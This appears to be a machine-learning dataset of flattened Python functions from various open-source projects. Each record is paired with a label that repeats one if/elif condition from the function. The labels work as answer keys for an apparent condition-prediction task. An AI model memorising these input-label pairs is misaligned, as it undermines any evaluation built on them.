{"input": "def types(model_cls): # Gives us `item_types` and `album_types` attr_name = \"{0}_types\".format(model_cls.__name__.lower()) types = {} for plugin in find_plugins(): plugin_types = getattr(plugin, attr_name, {}) for field in plugin_types: if field in types and plugin_types[field] != types[field]: raise PluginConflictException( u\"Plugin {0} defines flexible field {1} \" u\"which has already been defined with \" u\"another type.\".format(plugin.name, field) ) types.update(plugin_types) return types", "label": "if field in types and plugin_types [ field ] != types [ field ] :"}
{"input": "def set_origin(self, origin): # This is useful to modify an exception to add origin information as # it \"passes by\", without losing traceback information. (In Python 3 # we can use the built-in exception wrapping stuff, but it will be # some time before we can count on that...) if self.origin is None: if hasattr(origin, \"origin\"): origin = origin.origin if not isinstance(origin, patsy.origin.Origin): origin = None self.origin = origin", "label": "if hasattr ( origin , \"origin\" ) :"}
{"input": "def items(self): if self._items is not None: return self._items items = self.get_option(\"recent-connections\") if not items: self._items = [] return self._items for i in reversed(items): if \"name\" not in i or \"uuid\" not in i: items.remove(i) try: i[\"device\"] = self.get_device_path(i) except AdapterNotFound: i[\"device\"] = None except DeviceNotFound: items.remove(i) i[\"time\"] = float(i[\"time\"]) self._items = items return self._items", "label": "if \"name\" not in i or \"uuid\" not in i :"}
{"input": "def test_doc_attributes(self): print_test_name(\"TEST DOC ATTRIBUTES\") correct = 0 for example in DOC_EXAMPLES: original_schema = schema.parse(example.schema_string) if original_schema.doc is not None: correct += 1 if original_schema.type == \"record\": for f in original_schema.fields: if f.doc is None: self.fail( \"Failed to preserve 'doc' in fields: \" + example.schema_string ) self.assertEqual(correct, len(DOC_EXAMPLES))", "label": "if f . doc is None :"}
{"input": "def StopBackgroundWorkload(self): \"\"\"Stop the background workoad.\"\"\" for workload in background_workload.BACKGROUND_WORKLOADS: if workload.IsEnabled(self): if self.OS_TYPE in workload.EXCLUDED_OS_TYPES: raise NotImplementedError() workload.Stop(self)", "label": "if workload . IsEnabled ( self ) :"}
{"input": "def resolve_expression( self, query=None, allow_joins=True, reuse=None, summarize=False, for_save=False ): resolved = super(SearchQuery, self).resolve_expression( query, allow_joins, reuse, summarize, for_save ) if self.config: if not hasattr(self.config, \"resolve_expression\"): resolved.config = Value(self.config).resolve_expression( query, allow_joins, reuse, summarize, for_save ) else: resolved.config = self.config.resolve_expression( query, allow_joins, reuse, summarize, for_save ) return resolved", "label": "if not hasattr ( self . config , \"resolve_expression\" ) :"}
{"input": "def resolve_ip(filename, foffset, ip, need_line): sym, soffset, line = None, 0, None if filename and filename.startswith(\"/\"): sym, soffset = resolve_sym(filename, foffset) if not sym: sym, soffset = resolve_sym(filename, ip) if need_line: line = resolve_line(filename, ip) else: sym, soffset = kernel.resolve_kernel(ip) return sym, soffset, line", "label": "if need_line :"}
{"input": "def create_model(self, dataset, weight_name=Checkpoint._LATEST): if not self.is_empty: run_config = copy.deepcopy(self._checkpoint.run_config) model = instantiate_model(run_config, dataset) if hasattr(self._checkpoint, \"model_props\"): for k, v in self._checkpoint.model_props.items(): setattr(model, k, v) delattr(self._checkpoint, \"model_props\") self._initialize_model(model, weight_name) return model else: raise ValueError(\"Checkpoint is empty\")", "label": "if hasattr ( self . _checkpoint , \"model_props\" ) :"}
{"input": "def get_py2exe_datafiles(): datapath = get_data_path() head, tail = os.path.split(datapath) d = {} for root, dirs, files in os.walk(datapath): # Need to explicitly remove cocoa_agg files or py2exe complains # NOTE I dont know why, but do as previous version if \"Matplotlib.nib\" in files: files.remove(\"Matplotlib.nib\") files = [os.path.join(root, filename) for filename in files] root = root.replace(tail, \"mpl-data\") root = root[root.index(\"mpl-data\") :] d[root] = files return d.items()", "label": "if \"Matplotlib.nib\" in files :"}
{"input": "def mouseClickEvent(self, ev): if ev.button() == QtCore.Qt.LeftButton and self.allowAdd: pos = ev.pos() if pos.x() < 0 or pos.x() > self.length: return if pos.y() < 0 or pos.y() > self.tickSize: return pos.setX(min(max(pos.x(), 0), self.length)) self.addTick(pos.x() / self.length) elif ev.button() == QtCore.Qt.RightButton: self.showMenu(ev)", "label": "if pos . y ( ) < 0 or pos . y ( ) > self . tickSize :"}
{"input": "def image_preprocess(self, image): with tf.name_scope(\"image_preprocess\"): if image.dtype.base_dtype != tf.float32: image = tf.cast(image, tf.float32) mean = [0.485, 0.456, 0.406] # rgb std = [0.229, 0.224, 0.225] if self.image_bgr: mean = mean[::-1] std = std[::-1] image_mean = tf.constant(mean, dtype=tf.float32) * 255.0 image_std = tf.constant(std, dtype=tf.float32) * 255.0 image = (image - image_mean) / image_std return image", "label": "if image . dtype . base_dtype != tf . float32 :"}
{"input": "def _addConsoleMessage(self, type: str, args: List[JSHandle]) -> None: if not self.listeners(Page.Events.Console): for arg in args: self._client._loop.create_task(arg.dispose()) return textTokens = [] for arg in args: remoteObject = arg._remoteObject if remoteObject.get(\"objectId\"): textTokens.append(arg.toString()) else: textTokens.append(str(helper.valueFromRemoteObject(remoteObject))) message = ConsoleMessage(type, \" \".join(textTokens), args) self.emit(Page.Events.Console, message)", "label": "if remoteObject . get ( \"objectId\" ) :"}
{"input": "def _handle_guild_scalar(self, add_scalar, _tag, _value, step=None): \"\"\"Handler for guild.summary.SummaryWriter.add_scalar.\"\"\" vals = self._summary_values(step) if vals: self.log.debug(\"summary values via add_scalar: %s\", vals) for tag, val in vals.items(): if val is not None: add_scalar(tag, val, step)", "label": "if val is not None :"}
{"input": "def _get_token_from_cookie(self): for cookie in self.session.cookies: if cookie.name == \"X-APPLE-WEBAUTH-VALIDATE\": match = search(r\"\\bt=([^:]+)\", cookie.value) if match is None: raise Exception(\"Can't extract token from %r\" % cookie.value) return {\"token\": match.group(1)} raise Exception(\"Token cookie not found\")", "label": "if match is None :"}
{"input": "def unpack_RK(rk_str): flags = BYTES_ORD(rk_str[0]) if flags & 2: # There's a SIGNED 30-bit integer in there! (i,) = unpack(\"<i\", rk_str) i >>= 2 # div by 4 to drop the 2 flag bits if flags & 1: return i / 100.0 return float(i) else: # It's the most significant 30 bits of an IEEE 754 64-bit FP number (d,) = unpack(\"<d\", b\"\\0\\0\\0\\0\" + BYTES_LITERAL(chr(flags & 252)) + rk_str[1:4]) if flags & 1: return d / 100.0 return d", "label": "if flags & 1 :"}
{"input": "def _parse_photo(self): cat = \"lib\" for photosection in self.plex.library.sections(): if photosection.TYPE == library.PhotoSection.TYPE: self._load_attrs(photosection, cat) for photoalbum in photosection.all(): self._load_attrs(photoalbum, cat) for photo in photoalbum.photos(): self._load_attrs(photo, cat)", "label": "if photosection . TYPE == library . PhotoSection . TYPE :"}
{"input": "def count(num): cnt = 0 for i in range(num): try: if i % 2: raise ValueError if i % 3: raise ArithmeticError(\"1\") except Exception as e: cnt += 1 return cnt", "label": "if i % 2 :"}
{"input": "def node_exists(self, jid=None, node=None, ifrom=None): with self.lock: if jid is None: jid = self.xmpp.boundjid.full if node is None: node = \"\" if ifrom is None: ifrom = \"\" if isinstance(ifrom, JID): ifrom = ifrom.full if (jid, node, ifrom) not in self.nodes: return False return True", "label": "if jid is None :"}
{"input": "def __call__(self, environ, start_response): script_name = environ.get(\"HTTP_X_SCRIPT_NAME\") if script_name is not None: if script_name.endswith(\"/\"): warnings.warn( \"'X-Script-Name' header should not end in '/' (found: %r). \" \"Please fix your proxy's configuration.\" % script_name ) script_name = script_name.rstrip(\"/\") environ[\"SCRIPT_NAME\"] = script_name return super(ProxyFix, self).__call__(environ, start_response)", "label": "if script_name . endswith ( \"/\" ) :"}
{"input": "def backwardKillParagraph(self, event): \"\"\"Kill the previous paragraph.\"\"\" c = self.c w = self.editWidget(event) if not w: return self.beginCommand(w, undoType=\"backward-kill-paragraph\") try: self.backwardParagraphHelper(event, extend=True) i, j = w.getSelectionRange() if i > 0: i = min(i + 1, j) c.killBufferCommands.kill( event, i, j, force=True, undoType=None # Use i, j without change. ) w.setSelectionRange(i, i, insert=i) finally: self.endCommand(changed=True, setLabel=True)", "label": "if i > 0 :"}
{"input": "def bracket_replace(code): new = \"\" for e in bracket_split(code, [\"()\", \"[]\"], False): if e[0] == \"[\": name = \"#PYJSREPL\" + str(len(REPL)) + \"{\" new += name REPL[name] = e elif e[0] == \"(\": # can be a function call name = \"@PYJSREPL\" + str(len(REPL)) + \"}\" new += name REPL[name] = e else: new += e return new", "label": "elif e [ 0 ] == \"(\" :"}
{"input": "def regenerate(self, request, **kwargs): obj = self.get_object() if \"all\" in request.data: for user in User.objects.all(): if not user.is_anonymous(): token = Token.objects.get(user=user) token.delete() Token.objects.create(user=user) return Response(\"\") if \"username\" in request.data: obj = get_object_or_404(User, username=request.data[\"username\"]) self.check_object_permissions(self.request, obj) token = Token.objects.get(user=obj) token.delete() token = Token.objects.create(user=obj) return Response({\"token\": token.key})", "label": "if not user . is_anonymous ( ) :"}
{"input": "def signal_notebook_switch_page(self, notebook, current_page, index): if not hasattr(self.parent, \"rpc\"): return # previous_page = notebook.get_nth_page(self.last_page_id) self.last_page_id = index for tab in self.tabs.values(): if current_page != tab.box: continue if hasattr(tab, \"load_campaign_information\"): tab.load_campaign_information(force=False)", "label": "if current_page != tab . box :"}
{"input": "def get_word_parens_range(self, offset, opening=\"(\", closing=\")\"): end = self._find_word_end(offset) start_parens = self.code.index(opening, end) index = start_parens open_count = 0 while index < len(self.code): if self.code[index] == opening: open_count += 1 if self.code[index] == closing: open_count -= 1 if open_count == 0: return (start_parens, index + 1) index += 1 return (start_parens, index)", "label": "if self . code [ index ] == opening :"}
{"input": "def append(self, child): if child not in (None, self): tag = child_tag(self._tag) if tag: if isinstance(child, Html): if child.tag != tag: child = Html(tag, child) elif not child.startswith(\"<%s\" % tag): child = Html(tag, child) super().append(child)", "label": "elif not child . startswith ( \"<%s\" % tag ) :"}
{"input": "def cvPreprocess(): import cv2 imgarr_orig = [] image_ext_list = [\".jpg\", \".png\", \".JPEG\", \".jpeg\", \".PNG\", \".JPG\"] for file in onlyfiles: fimg = imgroot + file if any([x in image_ext_list for x in fimg]): print(fimg + \" is not an image file\") continue img1 = cv2.imread(fimg) if img1 is None: print(\"ERROR opening \", fimg) continue img1 = cv2.resize(img1, (896, 896)) imgarr_orig.append(img1) return imgarr_orig", "label": "if any ( [ x in image_ext_list for x in fimg ] ) :"}
{"input": "def replace_nodes_in_symbol_table( symbols: SymbolTable, replacements: Dict[SymbolNode, SymbolNode] ) -> None: for name, node in symbols.items(): if node.node: if node.node in replacements: new = replacements[node.node] old = node.node replace_object_state(new, old) node.node = new if isinstance(node.node, (Var, TypeAlias)): # Handle them here just in case these aren't exposed through the AST. node.node.accept(NodeReplaceVisitor(replacements))", "label": "if node . node :"}
{"input": "def __find_audio_offset(self, fileobj): byte = 0x00 while not (byte & 0x80): byte = ord(fileobj.read(1)) size = to_int_be(fileobj.read(3)) try: block_type = self.METADATA_BLOCKS[byte & 0x7F] except IndexError: block_type = None if block_type and block_type._distrust_size: # See comments in read_metadata_block; the size can't # be trusted for Vorbis comment blocks and Picture block block_type(fileobj) else: fileobj.read(size) return fileobj.tell()", "label": "if block_type and block_type . _distrust_size :"}
{"input": "def startJail(self, name): with self.__lock: jail = self.__jails[name] if not jail.isAlive(): jail.start() elif name in self.__reload_state: logSys.info(\"Jail %r reloaded\", name) del self.__reload_state[name] if jail.idle: jail.idle = False", "label": "if not jail . isAlive ( ) :"}
{"input": "def get_resolved_dependencies(self): dependencies = [] for dependency in self.envconfig.deps: if dependency.indexserver is None: package = resolve_package(package_spec=dependency.name) if package != dependency.name: dependency = dependency.__class__(package) dependencies.append(dependency) return dependencies", "label": "if dependency . indexserver is None :"}
{"input": "def _compile(self): if not self._compiled: # special case match-all query if self._is_match_all(): return try: self._tokens = boolExpression.parseString(self._query, parseAll=self.strict) except ParseException: raise self._compiled = True", "label": "if self . _is_match_all ( ) :"}
{"input": "def _compute_features(self, images): output_blobs = self._forward(images) features = [] for blob in output_blobs: blob = blob.reshape((blob.shape[0], blob.shape[1])) if self.merge == \"max\": blob = blob.max(0) else: blob = self.merge(blob) features.append(blob) return np.vstack(features)", "label": "if self . merge == \"max\" :"}
{"input": "def _list_shape_iter(shape): last_shape = _void for item in shape: if item is Ellipsis: if last_shape is _void: raise ValueError( \"invalid shape spec: Ellipsis cannot be the\" \"first element\" ) while True: yield last_shape last_shape = item yield item", "label": "if item is Ellipsis :"}
{"input": "def tokenize_url(self, field): field = field.strip() tokens = field.split(\":\") offset = 0 if tokens[0] == \"http\": offset = 1 dstport = 80 if len(tokens) > 2: inttokens = tokens[2].split(\"/\") dstport = int(inttokens[0]) elif tokens[0] == \"https\": dstport = 443 else: if tokens[-1] is not None: dstport = int(tokens[-1]) tld = tldextract.extract(tokens[offset]) fqdn = \".\".join(part for part in tld if part) return (fqdn, dstport)", "label": "if len ( tokens ) > 2 :"}
{"input": "def assert_summary_equals(self, records, tag, step, value): for record in records[1:]: if record.summary.value[0].tag != tag: continue if record.step != step: continue self.assertEqual(value, tf.make_ndarray(record.summary.value[0].tensor)) return self.fail(\"Could not find record for tag {} and step {}\".format(tag, step))", "label": "if record . summary . value [ 0 ] . tag != tag :"}
{"input": "def getAttrDefault(key, fallback=None): try: default = defaultValuesCache[key] except KeyError: attrInfo = getAttributeInfo(key) if attrInfo is None: default = defaultValuesCache[key] = None else: default = defaultValuesCache[key] = attrInfo.defaultValue if default is None: default = fallback return default", "label": "if attrInfo is None :"}
{"input": "def __getattr__(self, key): if key in self._raw: val = self._raw[key] if key in (\"date\",): return pd.Timestamp(val) elif key in (\"open\", \"close\"): return pd.Timestamp(val).time() elif key in (\"session_open\", \"session_close\"): return pd.Timestamp(val[:2] + \":\" + val[-2:]).time() else: return val return super().__getattr__(key)", "label": "elif key in ( \"session_open\" , \"session_close\" ) :"}
{"input": "def _combine_to_jointcaller(processed): \"\"\"Add joint calling information to variants, while collapsing independent regions.\"\"\" by_vrn_file = collections.OrderedDict() for data in (x[0] for x in processed): key = ( tz.get_in((\"config\", \"algorithm\", \"jointcaller\"), data), data[\"vrn_file\"], ) if key not in by_vrn_file: by_vrn_file[key] = [] by_vrn_file[key].append(data) out = [] for grouped_data in by_vrn_file.values(): cur = grouped_data[0] out.append([cur]) return out", "label": "if key not in by_vrn_file :"}
{"input": "def assign_type(self, wb_type): if isinstance(wb_type, ListType): assigned_type = self.params[\"element_type\"].assign_type( wb_type.params[\"element_type\"] ) if not isinstance(assigned_type, InvalidType): return ListType(assigned_type) return InvalidType()", "label": "if not isinstance ( assigned_type , InvalidType ) :"}
{"input": "def set_billing_hours_and_amount(self): if not self.project: for timesheet in self.timesheets: ts_doc = frappe.get_doc(\"Timesheet\", timesheet.time_sheet) if not timesheet.billing_hours and ts_doc.total_billable_hours: timesheet.billing_hours = ts_doc.total_billable_hours if not timesheet.billing_amount and ts_doc.total_billable_amount: timesheet.billing_amount = ts_doc.total_billable_amount", "label": "if not timesheet . billing_amount and ts_doc . total_billable_amount :"}
{"input": "def add_changeset(repo_path, path_to_filename_in_archive): try: subprocess.check_output( [\"hg\", \"add\", path_to_filename_in_archive], stderr=subprocess.STDOUT, cwd=repo_path, ) except Exception as e: error_message = \"Error adding '{}' to repository: {}\".format( path_to_filename_in_archive, unicodify(e) ) if isinstance(e, subprocess.CalledProcessError): error_message += \"\\nOutput was:\\n%s\" % unicodify(e.output) raise Exception(error_message)", "label": "if isinstance ( e , subprocess . CalledProcessError ) :"}
{"input": "def full_path(self, *args, **query): \"\"\"Return a full path\"\"\" path = None if args: if len(args) > 1: raise TypeError( \"full_url() takes exactly 1 argument \" \"(%s given)\" % len(args) ) path = args[0] if not path: path = self.path elif not path.startswith(\"/\"): path = remove_double_slash(\"%s/%s\" % (self.path, path)) return iri_to_uri(path, query)", "label": "if len ( args ) > 1 :"}
{"input": "def retry_http_basic_auth(self, host, req, realm): user, pw = self.passwd.find_user_password(realm, host) if pw is not None: raw = \"%s:%s\" % (user, pw) auth = \"Basic %s\" % base64.b64encode(raw).strip() if req.get_header(self.auth_header, None) == auth: return None req.add_unredirected_header(self.auth_header, auth) return self.parent.open(req, timeout=req.timeout) else: return None", "label": "if req . get_header ( self . auth_header , None ) == auth :"}
{"input": "def __call__(self, data): num_points = data.pos.shape[0] new_data = Data() for key in data.keys: if key == KDTREE_KEY: continue item = data[key] if torch.is_tensor(item) and num_points == item.shape[0]: item = item[self._indices].clone() elif torch.is_tensor(item): item = item.clone() setattr(new_data, key, item) return new_data", "label": "if key == KDTREE_KEY :"}
{"input": "def flat(tree): stack = [tree] result = [] stack_pop = stack.pop stack_extend = stack.extend result_append = result.append while stack: x = stack_pop() if isinstance(x, basestring): result_append(x) else: try: stack_extend(x) except TypeError: result_append(x) return result[::-1]", "label": "if isinstance ( x , basestring ) :"}
{"input": "def do_remove(self): if self.netconf.locked(\"dhcp\"): if not self.pid: pid = read_pid_file(\"/var/run/dnsmasq.pan1.pid\") else: pid = self.pid if not kill(pid, \"dnsmasq\"): logging.info(\"Stale dhcp lockfile found\") self.netconf.unlock(\"dhcp\")", "label": "if not self . pid :"}
{"input": "def set_xticklabels(self, labels=None, step=None, **kwargs): \"\"\"Set x axis tick labels on the bottom row of the grid.\"\"\" for ax in self.axes[-1, :]: if labels is None: labels = [l.get_text() for l in ax.get_xticklabels()] if step is not None: xticks = ax.get_xticks()[::step] labels = labels[::step] ax.set_xticks(xticks) ax.set_xticklabels(labels, **kwargs) return self", "label": "if labels is None :"}
{"input": "def _resolved_values(self): values = [] for k, v in self.values.items() if hasattr(self.values, \"items\") else self.values: if self.mapper: if isinstance(k, util.string_types): desc = _entity_descriptor(self.mapper, k) values.extend(desc._bulk_update_tuples(v)) elif isinstance(k, attributes.QueryableAttribute): values.extend(k._bulk_update_tuples(v)) else: values.append((k, v)) else: values.append((k, v)) return values", "label": "if isinstance ( k , util . string_types ) :"}
{"input": "def _print_handles(self, text, handle_list): for handle in handle_list: source, citation = self.get_source_or_citation(handle, False) _LOG.debug(\"\\n\\n\\n\") if source: _LOG.debug(\"---- %s -- source %s\" % (text, source.get_title())) elif citation: _LOG.debug(\"---- %s -- citation %s\" % (text, citation.get_page())) else: _LOG.debug(\"---- %s -- handle %s\" % (text, handle))", "label": "if source :"}
{"input": "def test_items(self): expectException = ( len(self.sparse_data) < len(self.data) and not self.instance.A._default_val is None ) try: test = self.instance.A.items() # self.assertEqual( type(test), list ) if self.instance.A._default_val is None: self.validateDict(self.sparse_data.items(), test) else: self.validateDict(self.data.items(), test) # self.assertFalse(expectException) except ValueError: if not expectException: raise", "label": "if self . instance . A . _default_val is None :"}
{"input": "def __new__(cls, name, bases, d): rv = type.__new__(cls, name, bases, d) if \"methods\" not in d: methods = set(rv.methods or []) for key, value in d.iteritems(): if key in http_method_funcs: methods.add(key.upper()) # if we have no method at all in there we don't want to # add a method list. (This is for instance the case for # the baseclass or another subclass of a base method view # that does not introduce new methods). if methods: rv.methods = sorted(methods) return rv", "label": "if methods :"}
{"input": "def getResultSummary(self): if self.descriptionDone is not None or self.description is not None: stepsumm = util.join_list(self.descriptionDone or self.description) if self.descriptionSuffix: stepsumm += u\" \" + util.join_list(self.descriptionSuffix) else: stepsumm = u\"finished\" if self.results != SUCCESS: stepsumm += u\" (%s)\" % Results[self.results] return {u\"step\": stepsumm}", "label": "if self . descriptionSuffix :"}
{"input": "def analyze_items(items, category_id, agg_data): for item in items: if not agg_data[\"cat_asp\"].get(category_id, None): agg_data[\"cat_asp\"][category_id] = [] agg_data[\"cat_asp\"][category_id].append( float(item.sellingStatus.currentPrice.value) ) if getattr(item.listingInfo, \"watchCount\", None): agg_data[\"watch_count\"] += int(item.listingInfo.watchCount) if getattr(item, \"postalCode\", None): agg_data[\"postal_code\"] = item.postalCode", "label": "if getattr ( item , \"postalCode\" , None ) :"}
{"input": "def _Determine_Do(self): from os.path import join self.applicable = 1 siloedPythonInstallDir = black.configure.items[\"siloedPythonInstallDir\"].Get() if sys.platform == \"darwin\": siloedPyVer = black.configure.items[\"siloedPyVer\"].Get() self.value = join( siloedPythonInstallDir, \"Python.framework\", \"Versions\", siloedPyVer, \"bin\" ) else: self.value = siloedPythonInstallDir if sys.platform != \"win32\": self.value = join(self.value, \"bin\") self.determined = 1", "label": "if sys . platform != \"win32\" :"}
{"input": "def work(self): idle_times = 0 while True: if shutting_down.is_set(): log.info(\"Stop sync worker\") break try: job = self.commit_queue.get(timeout=self.timeout, block=True) if job[\"type\"] == \"commit\": self.commits.append(job) log.debug(\"Got a commit job\") idle_times = 0 idle.clear() except Empty: log.debug(\"Nothing to do right now, going idle\") if idle_times > self.min_idle_times: idle.set() idle_times += 1 self.on_idle()", "label": "if shutting_down . is_set ( ) :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_module(d.getPrefixedString()) continue if tt == 18: self.set_version(d.getPrefixedString()) continue if tt == 24: self.set_instances(d.getVarInt64()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 0 :"}
{"input": "def expand_group(client: Any, group_key: str): \"\"\"Determines if an email is really a dl.\"\"\" # NOTE: Google Groups does not support other DLs as Group owners # https://stackoverflow.com/questions/31552146/group-as-owner-or-manager-fails-with-400-error try: response = list_members(client, group_key, propagate_errors=True) if response.get(\"members\"): return [x[\"email\"] for x in response.get(\"members\", [])] except HttpError as e: if e.resp.status == 404: pass return []", "label": "if e . resp . status == 404 :"}
{"input": "def validate_against_domain( cls, ensemble: Optional[\"PolicyEnsemble\"], domain: Optional[Domain] ) -> None: if ensemble is None: return for p in ensemble.policies: if not isinstance(p, TwoStageFallbackPolicy): continue if domain is None or p.deny_suggestion_intent_name not in domain.intents: raise InvalidDomain( \"The intent '{0}' must be present in the \" \"domain file to use TwoStageFallbackPolicy. \" \"Either include the intent '{0}' in your domain \" \"or exclude the TwoStageFallbackPolicy from your \" \"policy configuration\".format(p.deny_suggestion_intent_name) )", "label": "if domain is None or p . deny_suggestion_intent_name not in domain . intents :"}
{"input": "def _ndvi(nir_data, red_data): out = np.zeros_like(nir_data) rows, cols = nir_data.shape for y in range(0, rows): for x in range(0, cols): nir = nir_data[y, x] red = red_data[y, x] if nir == red: # cover zero divison case continue soma = nir + red out[y, x] = (nir - red) / soma return out", "label": "if nir == red :"}
{"input": "def sysroot(): cmd = \"set sysroot remote:/\" if is_android(): if gdb.parameter(\"sysroot\") == \"target:\": gdb.execute(cmd) else: print(message.notice(\"sysroot is already set, skipping %r\" % cmd))", "label": "if gdb . parameter ( \"sysroot\" ) == \"target:\" :"}
{"input": "def _run(self): when_pressed = 0.0 pressed = False while not self._done.is_set(): now = time.monotonic() if now - when_pressed > self._debounce_time: if GPIO.input(self._channel) == self._expected: if not pressed: pressed = True when_pressed = now self._trigger(self._pressed_queue, self._pressed_callback) else: if pressed: pressed = False self._trigger(self._released_queue, self._released_callback) self._done.wait(0.05)", "label": "if not pressed :"}
{"input": "def find_comment(line): \"\"\"Finds the index of a comment # and returns None if not found\"\"\" instring, instring_char = False, \"\" for i, char in enumerate(line): if char in ('\"', \"'\"): if instring: if char == instring_char: instring = False instring_char = \"\" else: instring = True instring_char = char elif char == \"#\": if not instring: return i return None", "label": "elif char == \"#\" :"}
{"input": "def _deduplicate_data(self): # Remove duplicate entries, without recreating self.data object dup_lines = [] hash_set = set() for i, fields in enumerate(self.data): fields_hash = hash(self.separator.join(fields)) if fields_hash in hash_set: dup_lines.append(i) log.debug( 'Found duplicate entry in tool data table \"%s\", but duplicates are not allowed, removing additional entry for: \"%s\"', self.name, fields, ) else: hash_set.add(fields_hash) for i in reversed(dup_lines): self.data.pop(i)", "label": "if fields_hash in hash_set :"}
{"input": "def sample_independent( self, study: Study, trial: FrozenTrial, param_name: str, param_distribution: distributions.BaseDistribution, ) -> Any: self._raise_error_if_multi_objective(study) if self._warn_independent_sampling: complete_trials = self._get_trials(study) if len(complete_trials) >= self._n_startup_trials: self._log_independent_sampling(trial, param_name) return self._independent_sampler.sample_independent( study, trial, param_name, param_distribution )", "label": "if len ( complete_trials ) >= self . _n_startup_trials :"}
{"input": "def publish(self): \"\"\"Publish new events to the subscribers.\"\"\" while True: event = await self.event_source.get() str_buffer = [] if event == POISON_PILL: return if isinstance(event, str): str_buffer.append(event) elif event.type == EventTypes.BLOCK_VALID: str_buffer = map(json.dumps, eventify_block(event.data)) for str_item in str_buffer: for _, websocket in self.subscribers.items(): await websocket.send_str(str_item)", "label": "if event == POISON_PILL :"}
{"input": "def push(self): advice = self.check() if not self._context[\"silent\"]: if not self.hasPendingSync(advice): print(\"No changes to push.\") return choice = input(\"Continue? y/N:\") if choice != \"y\": print(\"Aborted on user command\") return print(\"push local changes to remote...\") self._publish.syncRemote(self._context[\"srcroot\"], advice)", "label": "if choice != \"y\" :"}
{"input": "def readline(self, limit=-1): i = self._rbuf.find(\"\\n\") while i < 0 and not (0 < limit <= len(self._rbuf)): new = self._raw_read(self._rbufsize) if not new: break i = new.find(\"\\n\") if i >= 0: i += len(self._rbuf) self._rbuf = self._rbuf + new if i < 0: i = len(self._rbuf) else: i += 1 if 0 <= limit < len(self._rbuf): i = limit data, self._rbuf = self._rbuf[:i], self._rbuf[i:] return data", "label": "if i >= 0 :"}
{"input": "def main(): init_app(set_backends=True, routes=False) dry_run = \"--dry\" in sys.argv if not dry_run: script_utils.add_file_logger(logger, __file__) with transaction.atomic(): normalize_source_tags() add_claimed_tags() add_osf_provider_tags() add_prereg_campaign_tags() if dry_run: raise RuntimeError(\"Dry run, transaction rolled back\")", "label": "if dry_run :"}
{"input": "def iter_segments(self): while not self.closed: for chunk in filter(self.valid_chunk, self.chunks): self.logger.debug(\"Adding chunk {0} to queue\", chunk.num) yield chunk # End of stream if self.closed: return self.chunk_id = chunk.num + 1 if self.wait(self.module_info_reload_time): try: self.process_module_info() except StreamError as err: self.logger.warning(\"Failed to process module info: {0}\", err)", "label": "if self . closed :"}
{"input": "def SetItems(self, choices): self.choices = choices self.choice_names = self.get_choice_names() self.list_dlg.SetItems(self.get_choice_labels()) labels = self.get_choice_labels() for i in range(len(self.choices)): if self.choices[i][1] is None: # Tag missing items self.list_dlg.SetItemBackgroundColour(i, \"pink\") elif labels[i].endswith(\"Name!)\"): # Tag duplicated items self.list_dlg.SetItemForegroundColour(i, \"grey\") # on Mac, changing the items clears the current selection self.SetChecked(self.checked) self.Refresh()", "label": "elif labels [ i ] . endswith ( \"Name!)\" ) :"}
{"input": "def combine_logs(audit_logs, statement_text_logs): for audit_transaction in audit_logs: for audit_query in audit_logs[audit_transaction]: matching_statement_text_logs = statement_text_logs.get(hash(audit_query)) if matching_statement_text_logs: statement_text_log = matching_statement_text_logs.pop() if statement_text_log: if statement_text_log.start_time: audit_query.start_time = statement_text_log.start_time if statement_text_log.end_time: audit_query.end_time = statement_text_log.end_time", "label": "if statement_text_log . start_time :"}
{"input": "def handle_data(self, data): if self.in_span or self.in_div: if data == \"No such user (please note that login is case sensitive)\": self.no_user = True elif data == \"Invalid password\": self.bad_pw = True elif data == \"User with that email already exists\": self.already_exists = True", "label": "elif data == \"Invalid password\" :"}
{"input": "def K(exp): \"Helper function to specify keymap\" import re modifier_strs = [] while True: m = re.match(r\"\\A(C|Ctrl|M|Alt|Shift|Super|Win)-\", exp) if m is None: break modifier = m.group(1) modifier_strs.append(modifier) exp = re.sub(r\"\\A{}-\".format(modifier), \"\", exp) key_str = exp.upper() key = getattr(Key, key_str) return Combo(create_modifiers_from_strings(modifier_strs), key)", "label": "if m is None :"}
{"input": "def local_min(self, hmap): rows = len(hmap) cols = len(hmap[0]) min_list = [] for row in range(rows): for col in range(cols): for d_row, d_col in ((1, 0), (0, 1), (-1, 0), (0, -1)): h_row = (row + d_row) % rows h_col = (col + d_col) % cols if hmap[h_row][h_col] < hmap[row][col]: break else: min_list.append((row, col)) return min_list", "label": "if hmap [ h_row ] [ h_col ] < hmap [ row ] [ col ] :"}
{"input": "def _check_processing(self): now = time.time() self.mutex.acquire() while ( self.processing.qsize() and self.processing.top and self.processing.top.exetime < now ): task = self.processing.get_nowait() if task.taskid is None: continue task.exetime = 0 self.priority_queue.put(task) logger.info(\"processing: retry %s\", task.taskid) self.mutex.release()", "label": "if task . taskid is None :"}
{"input": "def autoname(self): naming_method = frappe.db.get_value(\"HR Settings\", None, \"emp_created_by\") if not naming_method: throw(_(\"Please setup Employee Naming System in Human Resource > HR Settings\")) else: if naming_method == \"Naming Series\": set_name_by_naming_series(self) elif naming_method == \"Employee Number\": self.name = self.employee_number elif naming_method == \"Full Name\": self.set_employee_name() self.name = self.employee_name self.employee = self.name", "label": "elif naming_method == \"Employee Number\" :"}
{"input": "def __fixdict(self, dict): for key in dict.keys(): if key[:6] == \"start_\": tag = key[6:] start, end = self.elements.get(tag, (None, None)) if start is None: self.elements[tag] = getattr(self, key), end elif key[:4] == \"end_\": tag = key[4:] start, end = self.elements.get(tag, (None, None)) if end is None: self.elements[tag] = start, getattr(self, key)", "label": "if end is None :"}
{"input": "def parseAGL(filename): # -> { 2126: 'Omega', ... } m = {} for line in readLines(filename): # Omega;2126 # dalethatafpatah;05D3 05B2 # higher-level combinations; ignored line = line.strip() if len(line) > 0 and line[0] != \"#\": name, uc = tuple([c.strip() for c in line.split(\";\")]) if uc.find(\" \") == -1: # it's a 1:1 mapping m[int(uc, 16)] = name return m", "label": "if len ( line ) > 0 and line [ 0 ] != \"#\" :"}
{"input": "def password(self, password): self._password = password if password: if not which(\"sshpass\"): self.eeprint( \"Install sshpass to using password: https://duckduckgo.com/?q=install+sshpass\\n\" + \"Note! There are a lot of security reasons to stop using password auth.\" ) verbose = \"-v\" if \"-v\" in self.sshpass else [] self.sshpass = [\"sshpass\", \"-p\", password] + verbose else: self.sshpass = []", "label": "if not which ( \"sshpass\" ) :"}
